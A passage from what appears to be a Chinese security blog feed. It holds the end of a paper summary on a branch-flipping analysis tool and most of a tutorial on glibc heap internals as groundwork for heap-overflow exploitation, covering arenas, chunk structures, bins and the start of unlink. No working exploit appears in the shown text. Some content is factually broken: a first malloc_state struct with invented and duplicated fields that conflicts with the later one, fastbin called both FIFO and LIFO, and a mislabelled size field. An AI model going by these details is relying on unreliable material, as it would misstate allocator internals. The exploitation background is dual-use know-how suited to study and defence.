alt=\"image-20230628205325968\"></p>\n<p>VIPER在对程序分析后，最终会报告当前程序中存在的各种危险的关键分支，系统调用及其保护变量。</p>\n<p>​\tBranchForcer运行包含原始输入的程序，并记录执行的分支和系统调用。然后，使用相同的输入多次运行程序，并为每次新的执行翻转一个不同分支的目标。如果重新执行触发了新的与安全性相关的系统调用，我们将当前分支添加到候选列表中。对于每个候选分支，VariableRator再次运行程序，以记录执行的完整跟踪，包括分支序列、所有内存访问地址和进程内存布局。利用记录的轨迹对程序IR进行反向数据流分析。VariableRator检查内存布局以确定每个内存节点的位置，并计算内存写指令的数量以估计节点的生命周期</p>\n<h3 id=\"分支记录\"><a href=\"#分支记录\" class=\"headerlink\" title=\"分支记录\"></a>分支记录</h3><p>​\t由于在执行的过程中可能会出现路径爆炸以及某些分支翻转了没有意义，因此只在固定路径上做分支翻转。每个分支只会做一次翻转。为了提高效率，使用多线程尽心探索。</p>\n<p>​\t每次使用相同的输入和不同的分支翻转执行程序，如果遇到新的系统调用就将当前路径做为候选路径进行存储，然后进行完整的分支执行分析，利用数据流进行后向切片，确定所有与分支保护状态相关的指令。利用值集分析来找到控制变量中所有可能的值。</p>\n<p>​\t</p>\n",
            "tags": [
                "paper"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/05/12/dui-yi-chu-li-yong/",
            "url": "https://alazymechnaic.github.io/2023/05/12/dui-yi-chu-li-yong/",
            "title": "堆溢出利用",
            "date_published": "2023-05-12T11:47:55.000Z",
            "content_html": "<h1 id=\"堆利用\"><a href=\"#堆利用\" class=\"headerlink\" title=\"堆利用\"></a>堆利用</h1><hr>\n<p>​\t本文用于介绍当前堆管理方式，堆溢出原理，常见的攻击方式及相关例题题解。</p>\n<h2 id=\"堆管理机制\"><a href=\"#堆管理机制\" class=\"headerlink\" title=\"堆管理机制\"></a>堆管理机制</h2><p>​\t堆区域与栈区域在内存使用上存在不同：</p>\n<ul>\n<li>堆位于当前程序中较低的地址位置，栈位于当前程序中的较高内存空间位置</li>\n<li>堆在使用时从低地址内存向高地址内存增长，栈从高地址内存向低地址内存增长</li>\n<li><strong>堆和栈都可以是每个线程所有独有的，堆依然存在线程堆的概念</strong></li>\n</ul>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172015938.png\" alt=\"先知社区https://xz.aliyun.com/t/10650\"></p>\n<p>(上图中的共享库段中包含有不同权限的几个内存段，如下图所示，其中mapped区域是当前so文件代码段对应的heap段)</p>\n<p><img src=\"/HEAP-EXP-heap-management.assets/image-20230613200729790.png\" alt=\"image-20230613200729790\"></p>\n<h2 id=\"内存管理\"><a href=\"#内存管理\" class=\"headerlink\" title=\"内存管理\"></a>内存管理</h2><ul>\n<li>32位下的text段是即时elf文件装入操作系统的起始位置0x8048000，也就是整个虚拟内存中用户可用的起始位置,最远的访问位置到0xbfffffff.</li>\n<li>64位下的内存起始位置在0x0000000000400000处，64位下总的内存大小为2的48次方，</li>\n</ul>\n<h4 id=\"内存的分配管理策略\"><a href=\"#内存的分配管理策略\" class=\"headerlink\" title=\"内存的分配管理策略\"></a>内存的分配管理策略</h4><ul>\n<li>具有较长生命周期的大内存使用mmap进行分配（例如说，在初始化给用户分配堆的过程）</li>\n<li>特别大的内存分配使用的是mmap，<strong>使用mmap申请的内存在释放后并不会放入bin，而是直接还给操作系统，因为这一部分内存块一般都比较大</strong></li>\n<li>短生命周期的内存分配使用brk，因为使用mmap分配的内存块需要多个物理页，浪费资源</li>\n<li>空闲小块是被管理，大内存块和长生命周期块都是直接回收返还给内存</li>\n<li>对于空闲的小内存块只会在malloc和free的时候进行合并，free后的空闲块可能放入pool中</li>\n<li><strong>注意一点，在程序运行初期会使用brk分配一个内存空间，该内存空间中的内容再被用户进行各种malloc的分配，该分配区域被称作为主分配区，由brk和sbrk两个指针限定边缘。如果当前的heap0中有合适的小内存块就直接分配，但是当使用free时，合并后的chunk大小大于64kb时才会将顶端的空闲内存返回给操作系统</strong></li>\n</ul>\n<h4 id=\"arena分配区机制\"><a href=\"#arena分配区机制\" class=\"headerlink\" title=\"arena分配区机制\"></a>arena分配区机制</h4><ul>\n<li>arena就是mmap heap1/heap2等，该分配区一旦产生就不能再减少。每个arena中都使用独立的bin机制来管理当前线程的内存块，<strong>但是如果是单线程程序也可以拥有多个arena</strong>，多个线程存在时，在malloc后可以使用其他线程的arena来分配内存：<ul>\n<li>首先循环遍历所有可用的 <em>arena</em>，在遍历的过程中，它会尝试加锁该 <em>arena</em>。如果成功加锁（该 <em>arena</em> 当前对应的线程并未使用堆内存则表示可加锁），比如将 <em>main arena</em> 成功锁住，那么就将 <em>main arena</em> 返回给用户，即表示该 <em>arena</em> 被子线程 3 共享使用。</li>\n<li>如果没能找到可用的 <em>arena</em>，那么就将子线程 3 的 <code>malloc</code> 操作阻塞，直到有可用的 <em>arena</em> 为止</li>\n<li>现在，如果子线程 3 再次调用 <code>malloc</code> 的话，<code>glibc</code> 的 <code>malloc</code> 就会先尝试使用最近访问的 <em>arena</em>（此时为 <em>main arena</em>）。如果此时 <em>main arena</em> 可用的话，就直接使用，否则就将子线程 3 阻塞，直到 <em>main arena</em> 再次可用为止。</li>\n</ul>\n</li>\n<li>在创建非主分配区时会先mmap创建分为一块较大的内存空间来模拟sub-heap（也就是类似主分配区的heap段），当然有heap就有top段的内容，topchunk是永远不会放在bin中的，因为top chunk总是在fast bin与bin之后被考虑。</li>\n<li>每个进程只能有一个主分配区，但有多个非主分配区<ul>\n<li>主分配区可以使用brk和mmap两种方式进行内存的分配</li>\n<li>非主分配区只能使用mmap的方式进行内存的分配，但与主分配区相同，都使用链表进行管理</li>\n<li>同样在多线程下，主线程能够使用主分配区，当然其他线程也可以，线程之间对于堆内存的访问是不存在限制的，因此其他线程也是能够释放主线程内存的，但是分配区存在锁机制，对分配区的操作要进行互斥。线程在使用内存时，只能通过先用mmap申请一块大内存（32位默认1MB，64位默认64MB）到用户空间，再使用malloc一点一点分配出去。这个mmap分出来的这块内存就是非主分配区，管理这块内存的就是arena</li>\n<li>可以看到一个线程只能有一个分配区（arena）但是一个arena可以管理多个堆块，主分配区域只需要管理一个堆块就可以了，就是使用brk分配的那个。</li>\n<li>多线程环境下内存的分配与回收：<ul>\n<li>查看当前线程下是否存在一个分配区，若存在一个分配区则尝试加锁，进行后续操作；如果加锁失败，则让分配器循环遍历arena，找到没有加锁的arena进行内存的分配操作；若所有的arena都在用，则使用malloc重新开辟一个新的内存空间，构造一个新的分配区；</li>\n<li>当进行内存的释放时，内存所在的分配区被加锁则等待，直到互斥锁被解开之后才能继续使用。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>进一步的，每个arena管理的heap可以抽象成一个在地址上连续的内存片段，内存片段被抽象为无数个chunk未被分配的chunk都视为top chunk，对于已经释放的free chunk部分则会使用一个双向链表进行管理，每次在分配时会遍历这个双向链表选择最合适的内存块，而管理各种不同的空闲块的管理器就是bin机制。</li>\n</ul>\n<h2 id=\"堆管理的数据结构\"><a href=\"#堆管理的数据结构\" class=\"headerlink\" title=\"堆管理的数据结构\"></a>堆管理的数据结构</h2><h3 id=\"heap-info\"><a href=\"#heap-info\" class=\"headerlink\" title=\"heap_info\"></a>heap_info</h3><p>​\t一个程序在运行时不只是存在一个主线程的heap，还会存在其他线程的heap（使用mmap申请的heap，使用该线程的arena进行管理），那么这些heap的信息需要使用一个heap_info 的结构进行管理，所以这部分的结构也叫作heap header。</p>\n<p>​\t主线程的堆不是分配在内存映射区，而是进程的虚拟内存堆区，因此不含有多个 <em>heap</em> 所以也就不含有 <code>heap_info</code> 结构体。当需要更多堆空间的时候，直接通过增长 <code>brk</code> 指针来获取更多的空间，直到它碰到内存映射区域为止</p>\n<p>​\t依照该数据结构的情况能够看到：</p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">heap_info</span></span><br><span class=\"hljs-class\">{</span><br>  <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">heap_info</span> *<span class=\"hljs-title\">prev</span>;</span>  <span class=\"hljs-comment\">//指向前一个heap_info结构</span><br>  <span class=\"hljs-type\">size_t</span> size;  <span class=\"hljs-comment\">//当前heap_info结构所描述的堆内存大小</span><br>  <span class=\"hljs-type\">int</span> mmaped;  <span class=\"hljs-comment\">//标记当前堆内存是否由mmap系统调用分配</span><br>  <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">heap_info</span> *<span class=\"hljs-title\">next</span>;</span>  <span class=\"hljs-comment\">//指向后一个heap_info结构</span><br>  <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">arena</span> *<span class=\"hljs-title\">ar_ptr</span>;</span>  <span class=\"hljs-comment\">//指向当前堆内存所在的arena</span><br>};<br></code></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"malloc-state\"><a href=\"#malloc-state\" class=\"headerlink\" title=\"malloc_state\"></a>malloc_state</h3><p><code>malloc_state</code> 用于表示 <em>arena</em> 的信息，因此也被称为 <em>arena header</em>，每个线程只含有一个 <em>arena header</em>。<em>arena header</em> 包含 <em>bin</em>、<em>top chunk</em> 以及 <em>last remainder chunk</em> 等信息</p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc_state</span> {</span><br>  <span class=\"hljs-type\">binmap_t</span>     binmap[BINMAPSIZE];  <span class=\"hljs-comment\">// 用于标记哪些 bin 是非空的</span><br>  mfastbinptr  fastbinsY[NFASTBINS];  <span class=\"hljs-comment\">// 用于存放小块内存的链表</span><br>  mchunkptr    top;  <span class=\"hljs-comment\">// 指向当前 arena 中最后一个已分配的 chunk</span><br>  mchunkptr    last_remainder;  <span class=\"hljs-comment\">// 指向上一个 arena 中未被使用完的 chunk</span><br>  mchunkptr    bins[NBINS * <span class=\"hljs-number\">2</span> - <span class=\"hljs-number\">2</span>];  <span class=\"hljs-comment\">// 用于存放各个 bin 中的 chunk</span><br>  <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc_state</span> *<span class=\"hljs-title\">next</span>;</span>  <span class=\"hljs-comment\">// 指向下一个 malloc_state 结构</span><br>  <span class=\"hljs-type\">uint64_t</span>     magic;  <span class=\"hljs-comment\">// 用于检查 malloc_state 结构的完整性</span><br>  <span class=\"hljs-type\">uint64_t</span>     flags;  <span class=\"hljs-comment\">// 保存了 malloc_state 的各种状态信息</span><br>  <span class=\"hljs-type\">mutex_t</span>      mutex;  <span class=\"hljs-comment\">// 用于保护 malloc_state 结构的互斥锁</span><br>  <span class=\"hljs-type\">char</span> *       seg;  <span class=\"hljs-comment\">// 指向当前 arena 的起始地址</span><br>  <span class=\"hljs-type\">size_t</span>       size;  <span class=\"hljs-comment\">// 当前 arena 的大小</span><br>  <span class=\"hljs-type\">size_t</span>       mprotect_size;  <span class=\"hljs-comment\">// 当前 arena 中已经保护的内存大小</span><br>  mchunkptr    mprotect_base;  <span class=\"hljs-comment\">// 当前 arena 中已经保护的内存的起始地址</span><br>  mchunkptr    last_remainder;  <span class=\"hljs-comment\">// 上一个 arena 中未被使用完的 chunk</span><br>  <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">heap_info</span> *<span class=\"hljs-title\">heap_info</span>;</span>  <span class=\"hljs-comment\">// 当前 arena 所在的 heap_info 结构</span><br>};<br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"chunk的组织形式\"><a href=\"#chunk的组织形式\" class=\"headerlink\" title=\"chunk的组织形式\"></a>chunk的组织形式</h3><figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc_chunk</span> {</span><br>  <span class=\"hljs-comment\">/* #define INTERNAL_SIZE_T size_t */</span><br>  INTERNAL_SIZE_T      prev_size;  <span class=\"hljs-comment\">/* 记录前一个chunk的大小，如果前一个chunk是free状态，此字段依然有用 ,而且该size的计算并不不包含前一个chunk的chunk头*/</span><br>  INTERNAL_SIZE_T      size;       <span class=\"hljs-comment\">/* 指向在bin中时前一个chunk和后一个chunk的位置，因此只有空闲状态的chunk使用 */</span><br>  <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc_chunk</span>* <span class=\"hljs-title\">fd</span>;</span>    <br>  <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc_chunk</span>* <span class=\"hljs-title\">bk</span>;</span><br>\t<span class=\"hljs-comment\">/* 上下这两个指针占用相同的空间 区别在于当前chunk是free的时候*/</span><br>  <span class=\"hljs-comment\">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc_chunk</span>* <span class=\"hljs-title\">fd_nextsize</span>;</span> <span class=\"hljs-comment\">/* double links -- used only if free. */</span><br>  <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc_chunk</span>* <span class=\"hljs-title\">bk_nextsize</span>;</span><br>};<br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<ul>\n<li>chunk在32位下的8字节对齐，在64位下的16字节对齐，因此allocater返回的chunk要比实际需要的稍大一些</li>\n<li>基本的chunk分配策略是首先在先前释放的chunk中找到合适的，如果没有择取heap区域的chunk</li>\n<li>如果上面的方法均不成功，则会去要求系统新分配一块内存mmap方法</li>\n</ul>\n<p><strong>已分配chunk的数据结构情况</strong></p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172016938.png\" alt=\"image-20230613234305496\"></p>\n<p><strong>未分配的chunk数据结构情况</strong></p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172016286.png\" alt=\"image-20230613234401273\"></p>\n<p>​\t在上面能够很明显的看到chunk在使用状态下原本存放fd和bk的位置会被直接用来存放用户数据。用户在使用malloc时返回的内存指针是指向chunk头后面的部分，在free后指向的fd的存放位置。</p>\n<p>​\t这里的p是标志前一个chunk（地址更小的）是否处于被使用的状态，如果是则置位1，且prev_size有效（标志相邻的堆块大小，这里是指物理上相邻，主要用于进行内存块的合并操作，<strong>且prev_size的大小指的是包含当前块头部和用户数据的部分</strong>）</p>\n<figure class=\"highlight apache\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">N</span>：是不是「主分配区」分配的内存 <span class=\"hljs-number\">1</span> 表示不是主分配区分配的，<span class=\"hljs-number\">0</span> 表示是主分配区分配的<br><br><span class=\"hljs-attribute\">M</span>：是不是 Memory Mapped 分配的内存，<span class=\"hljs-number\">1</span> 表示是，<span class=\"hljs-number\">0</span> 表示是 heap<br><br><span class=\"hljs-attribute\">P</span>：表示前一个 chunk 是否在使用，在初始化的时候通常为 <span class=\"hljs-number\">1</span>，防止使用不能访问的内存<br></code></pre></td></tr></tbody></table></figure>\n\n<p><a href=\"https://www.freebuf.com/articles/system/171261.html\">https://www.freebuf.com/articles/system/171261.html</a></p>\n<p><a href=\"https://blog.csdn.net/Breeze_CAT/article/details/103788698\">https://blog.csdn.net/Breeze_CAT/article/details/103788698</a></p>\n<h3 id=\"tcache（thread-local-caching）机制\"><a href=\"#tcache（thread-local-caching）机制\" class=\"headerlink\" title=\"tcache（thread local caching）机制\"></a>tcache（thread local caching）机制</h3><ul>\n<li><code>tcache</code>属于一种缓存机制，它为每一个线程创建了一个缓存，从而实现了不加锁的堆块分配算法，起到了性能提升的作用。</li>\n<li>仅适用于glibc2.26以上的版本使用</li>\n</ul>\n<h3 id=\"Bin机制\"><a href=\"#Bin机制\" class=\"headerlink\" title=\"Bin机制\"></a>Bin机制</h3><ul>\n<li>ptmalloc 一共维护128个bin，使用数组存储链表头，</li>\n<li><strong>fast bin</strong>：fastbin是一些要被系统回收的较小的内存块，此类内存块使用一个<strong>单向链表</strong>进行存储，该bin中的所有chunk都不会被合并。内存分配时会先在fastbins中进行查找，随后才会在其他bin中进行查找。（chunksize &lt; maxsize时才会被放在fastbin中）采用先进先出标准进行管理。</li>\n<li><strong>small bin</strong>：专门存放size&lt;512的chunk，使用双向链表进行存储（也就是之前所说的拉链法存储），数组中的每个元素是chunk链的头，只有相同大小的bin能被存在一个链里，每个链之间相差8byte。共有62个循环双向链表。small bin与fast bin的某些大小是重合的，因此有些可以放入fastbin的块也可以在smallbin</li>\n<li><strong>large bin</strong>：需要对bin中的chunk按照大小进行排序。</li>\n<li><strong>unsorted bin</strong>：可以将其视为一个bin在回归其正确的所属bin之前的一个缓存，在释放一个不符合fast bin要求的chunk时会被先放入到unsorted bin中进行存储，同理，在进行chunk的切割后，剩余的某个部分是不合fast bin要求的则会将其放入unsorted bin中进行存储。与一般的bin不同之处在于，unsorted bin其本身只有一个。<ul>\n<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li>\n<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li>\n<li>fastchunk中的某些bin合并后大于fast bin的要求，那就先放入usorted bin等待后续的处理。</li>\n<li>unsorted bin在使用的过程中是FIFO的</li>\n</ul>\n</li>\n<li><strong>Top Chunk</strong>：Topchunk其实是在用户进行首次malloc时使用的内存，一部分给用户，一部分留给了Topchunk，当所有的bin都没有符合所需大小的时候，才会去动Top chunk，Top chunk的prevsize永远为1，否则前面的chunk就会被合并到Top Chunk中（也就是说链表中的前一个chunk始终不会被合并到top chunk中去），其实根据上面的过程不难发现，<strong>初始状态下的UNsorted chunk 就是 Top chunk</strong></li>\n<li>last reminder：其实就是经过malloc分配后切割出来的一块，这一块会放进unsorted bin中。</li>\n</ul>\n<h3 id=\"Bin运作流程\"><a href=\"#Bin运作流程\" class=\"headerlink\" title=\"Bin运作流程\"></a>Bin运作流程</h3><ul>\n<li>如果被用户释放的chunk大于max_fast，或者fast bins中的空闲chunk合并后，这些chunk首先会被放到unsorted bin队列中</li>\n<li>在进行malloc操作的时候，如果在fast bins中没有找到合适的chunk，则ptmalloc会先在unsorted bin中查找合适的空闲chunk，然后才查找bins。</li>\n<li>如果unsorted bin不能满足分配要求。malloc便会将unsorted bin中的chunk加入bins中。然后再从bins中继续进行查找和分配过程。</li>\n<li>unsorted bin可以看做是bins的一个缓冲区，增加它只是为了加快分配的速度。</li>\n<li>在size&gt;FASTBIM_CONNSOLIDATION_THRESHOLD,时(需要大chunk时)，ptmalloc会遍历fast bins中的chunk，将相邻的空闲chunk进行合并，并将合并后的chunk加入unsorted bin中，然后再将usorted bin里的chunk加入bins中。<br>Unsorted Bin</li>\n<li>空闲的chunk连入bin时,会将 P 设为 0 , 并检查前后chunk是否空闲,若空闲则合并后加入unsorted bins中</li>\n<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li>\n<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li>\n<li>当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话</li>\n<li>分配过程：fastbin-&gt;unsorted bin-&gt;其他bins-&gt;切割top chunk</li>\n<li>回收过程：<ul>\n<li>在maped区域，直接回收即可</li>\n<li>在heap区域：首先检查当前堆块是否符合fastbin的要求，如果不符合就将其先放入到unsorted bin中等待后续的处理</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"各个bin的处理先后顺序\"><a href=\"#各个bin的处理先后顺序\" class=\"headerlink\" title=\"各个bin的处理先后顺序\"></a>各个bin的处理先后顺序</h3><ul>\n<li>fastbin 是 LIFO (后入先出)</li>\n<li>unsorted bin是 FIFO (先进先出)</li>\n<li>small bin 是 FIFO</li>\n<li>large bin 是 FIFO</li>\n<li>tcache 是 LIFO</li>\n<li>实际利用时只要知道fastbin为了加快速度学习了栈的机制</li>\n</ul>\n<h3 id=\"线程堆\"><a href=\"#线程堆\" class=\"headerlink\" title=\"线程堆\"></a>线程堆</h3><ul>\n<li>每个线程在创建之初是会先申请一大块堆，使用heap_info结构对其进行记录，所有的heap通过单链表进行连接。一个线程可以有多个堆（其实就是初始分配的不够用），由于线程只能使用mmap，后续的堆要使用pre指针将heap_info进行连接。</li>\n</ul>\n<h3 id=\"malloc-state-1\"><a href=\"#malloc-state-1\" class=\"headerlink\" title=\"malloc_state\"></a>malloc_state</h3><ul>\n<li>该结构用于管理堆，记录每个 arena 当前申请的内存的具体状态，比如说是否有空闲 chunk，有什么大小的空闲 chunk 等等。</li>\n<li>无论是 thread arena 还是 main arena，它们都只有一个 malloc state 结构。</li>\n</ul>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc_state</span> {</span><br>    <span class=\"hljs-comment\">/* Serialize access.  */</span><br>    __libc_lock_define(, mutex);<br><br>    <span class=\"hljs-comment\">/* Flags (formerly in max_fast).  */</span><br>    <span class=\"hljs-type\">int</span> flags;<br><br>    <span class=\"hljs-comment\">/* Fastbins */</span><br>    mfastbinptr fastbinsY[ NFASTBINS ];<br><br>    <span class=\"hljs-comment\">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>    mchunkptr top;<br><br>    <span class=\"hljs-comment\">/* The remainder from the most recent split of a small request */</span><br>    mchunkptr last_remainder;<br><br>    <span class=\"hljs-comment\">/* Normal bins packed as described above */</span><br>    mchunkptr bins[ NBINS * <span class=\"hljs-number\">2</span> - <span class=\"hljs-number\">2</span> ];<br><br>    <span class=\"hljs-comment\">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span><br>    <span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">int</span> binmap[ BINMAPSIZE ];<br><br>    <span class=\"hljs-comment\">/* Linked list, points to the next arena */</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc_state</span> *<span class=\"hljs-title\">next</span>;</span><br><br>    <span class=\"hljs-comment\">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class=\"hljs-comment\">       by free_list_lock in arena.c.  */</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">malloc_state</span> *<span class=\"hljs-title\">next_free</span>;</span><br><br>    <span class=\"hljs-comment\">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class=\"hljs-comment\">       the free list.  Access to this field is serialized by</span><br><span class=\"hljs-comment\">       free_list_lock in arena.c.  */</span><br>    INTERNAL_SIZE_T attached_threads;<br><br>    <span class=\"hljs-comment\">/* Memory allocated from the system in this arena.  */</span><br>    INTERNAL_SIZE_T system_mem;<br>    INTERNAL_SIZE_T max_system_mem;<br>};<br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h2 id=\"堆管理函数\"><a href=\"#堆管理函数\" class=\"headerlink\" title=\"堆管理函数\"></a>堆管理函数</h2><h3 id=\"libc-malloc\"><a href=\"#libc-malloc\" class=\"headerlink\" title=\"libc_malloc\"></a>libc_malloc</h3><p>​\tmalloc函数的本质是libc_malloc, 该函数其实也是对_int_malloc函数做一个封装操作。</p>\n<p><strong>用户申请的字节一旦进入libc_malloc会转换为无符号整数</strong>，同时在源码中能看到其中包含一个对于malloc_hook函数指针的调用，是便于用于进行自定义的malloc函数的编写。</p>\n<h3 id=\"unlink\"><a href=\"#unlink\" class=\"headerlink\" title=\"unlink\"></a>unlink</h3><ul>\n<li>作用：将一个chunk从双向链表中取出来，其实就是解链操作，因此该函数的使用十分频繁。</li>\n<li>使用场景：<ul>\n<li><strong>malloc</strong><ul>\n<li>从恰好大小合适的 large bin 中获取 chunk。<ul>\n<li><strong>这里需要注意的是 fastbin 就没有使用 unlink，fastbin是单链表\t。</strong></li>\n<li><strong>依次遍历处理 unsorted bin 时也没有使用 unlink</strong> 。</li>\n</ul>\n</li>\n<li>从比请求的 chunk 所在的large bin 中取 chunk。</li>\n</ul>\n</li>\n<li><strong>free</strong><ul>\n<li>后向合并，合并物理相邻低地址空闲 chunk。</li>\n<li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li>\n</ul>\n</li>\n<li><strong>malloc_consolidate</strong>：用于合并的时候要把空闲块取出来先。<ul>\n<li>后向合并，合并物理相邻低地址空闲 chunk。</li>\n<li>前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li>\n</ul>\n</li>\n<li><strong>realloc</strong><ul>\n<li>前向扩展，合并物理相邻高地址空闲 chunk（除了 top chunk）。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-comment\">/* Take a chunk off a bin list */</span><br><span class=\"hljs-comment\">// unlink p</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> unlink(AV, P, BK, FD) {  <span class=\"hljs-comment\">//这里FD是前面的chunk，BK是后面的chunk,传入的BK和FD是空指针          \\</span></span><br><span class=\"hljs-comment\"><span class=\"hljs-meta\">    // 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br>\t<span class=\"hljs-comment\">// 这两个位置分别是下一个chunk的prevsize和他自己记录的chunksize大小</span><br>    <span class=\"hljs-keyword\">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 